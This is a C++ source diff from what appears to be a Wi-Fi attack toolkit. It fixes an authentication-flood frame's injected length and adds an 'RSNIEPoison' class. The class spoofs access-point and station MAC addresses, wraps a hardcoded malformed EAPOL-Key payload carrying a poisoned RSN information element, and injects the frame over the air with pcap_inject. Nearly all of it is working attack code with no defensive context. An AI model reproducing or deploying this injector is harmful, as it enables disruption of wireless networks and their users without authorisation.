@@ -252,7 +252,7 @@ bool Interface::setChannel(int channel) {
 #elif defined(__RASPBIAN__)
     cli << "iwconfig " << this->_ifname.c_str() << " channel " << channel;
 #else
-#warning Please implement `Interface::setChannel' on your platform
+#warning Please implement `Interface::setChannel` on your platform
 #endif
     return system(cli.str().c_str()) == 0;
 }
@@ -738,6 +738,66 @@ uint8_t * AuthFloodFrame::packet(size_t * bytes) const {
 void AuthFloodFrame::auth(const Interface & ifname) const {
     size_t len = 0;
     uint8_t * packet = this->packet(&len);
-    pcap_inject(ifname._pcap_handle, packet, 38);
+    pcap_inject(ifname._pcap_handle, packet, len);
     delete [] packet;
+}
+
+#pragma mark
+#pragma mark - RSNIEPoison
+
+RSNIEPoison::RSNIEPoison() {
+}
+
+RSNIEPoison::RSNIEPoison(const AP & ap, const STA & sta) {
+    this->_ap = std::make_shared<AP>(ap);
+    this->_sta = std::make_shared<STA>(sta);
+    this->_poison_data = std::make_shared<uint8_t *>(this->packet(NULL));
+}
+
+RSNIEPoison::RSNIEPoison(const RSNIEPoison & _) {
+    this->_ap = _._ap;
+    this->_sta = _._sta;
+    this->_poison_data = std::make_shared<uint8_t *>(new uint8_t[163]);
+    memcpy(*this->_poison_data, _._poison_data.get(), 163);
+}
+
+RSNIEPoison::~RSNIEPoison() {
+    if (this->_ap) this->_ap.reset();
+    if (this->_sta) this->_sta.reset();
+    if (this->_poison_data) this->_poison_data.reset();
+}
+
+uint8_t * RSNIEPoison::packet(size_t * bytes) const {
+    static const auto POISONED_AUTHENTICAION = "\x02\x03\x00\x75\x02\x01\x0A\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x23\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x33\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xBC\xBC\xBC\xBC\xBC\xBC\xBC\xBC\xBC\xBC\xBC\xBC\xBC\xBC\xBC\xBC\x00\x16\x30\x14\x01\x00\x00\x0F\xAC\x04\x01\x00\x00\x0F\xAC\x04\x01\x00\x00\x0F\xAC\x02\x0C\x00";
+    
+    uint8_t * data = new uint8_t[163];
+    bzero(data, 163);
+    
+    uint16_t header_len = 8;
+    memcpy(&data[2], &header_len, sizeof(uint16_t));
+    
+    MACHeader poison_header;
+    poison_header.fc.type = 2;
+    poison_header.fc.subtype = 8;
+    poison_header.duration = 0x013A;
+    poison_header.fc.to_ds = 1;
+    poison_header.sequence = 0;
+    poison_header.setDestination(this->_ap->_mac);
+    poison_header.setTransmitter(this->_sta->_mac);
+    poison_header.setSource(this->_ap->_mac);
+    uint8_t * poison_header_data = poison_header.data();
+    memcpy(&data[8], poison_header_data, 24);
+    delete [] poison_header_data;
+    
+    uint64_t LLC = __builtin_bswap64(0xAAAA03000000888E);
+    memcpy(&data[34], &LLC, 8);
+    memcpy(&data[42], POISONED_AUTHENTICAION, 121);
+    
+    if (bytes) *bytes = 163;
+
+    return data;
+}
+
+void RSNIEPoison::poison(const Interface & ifname) const {
+    pcap_inject(ifname._pcap_handle, *this->_poison_data, 163);
 }
